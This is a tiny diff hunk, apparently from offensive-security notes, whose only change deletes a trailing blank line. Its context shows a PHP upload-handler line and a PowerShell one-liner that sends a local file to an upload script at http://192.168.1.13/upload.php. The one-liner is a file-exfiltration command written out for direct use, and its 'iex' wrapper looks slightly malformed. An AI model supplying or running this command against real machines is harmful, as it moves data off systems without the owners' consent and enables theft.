@@ -58,4 +58,3 @@ move_uploaded_file($\_FILES['file']['tmp_name'], $uploadfile)
 ```
 powershell -c "iex(new-object system.net.webclient).uploadfile('http://192.168.1.13/upload.php', 'filename')"
 ```
-
